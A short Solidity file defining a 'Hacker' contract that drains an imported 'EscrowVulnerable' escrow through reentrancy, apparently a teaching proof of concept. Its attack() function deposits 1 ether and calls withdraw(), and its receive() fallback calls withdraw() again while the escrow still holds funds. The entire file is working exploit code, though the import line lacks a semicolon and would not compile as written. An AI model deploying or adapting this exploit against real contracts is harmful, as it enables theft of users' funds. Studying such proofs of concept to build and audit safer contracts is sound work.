// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./EscrowVulnerable.sol"

contract Hacker {
    EscrowVulnerable public vulnerableEscrowContract;

    constructor(address escrowAddress) {
        vulnerableEscrowContract = EscrowVulnerable(escrowAddress);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerableEscrowContract.deposit{value: 1 ether}();
        vulnerableEscrowContract.withdraw();
    }

    /*
    When ether is received by this contract we immediately reenter
    //the escrow contract, recursively calling withdraw() again,
    //blocking the execution of the previous function call
    */
    receive() external payable {
        if (address(vulnerableEscrowContract).balance >= 1 ether) {
            vulnerableEscrowContract.withdraw();
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
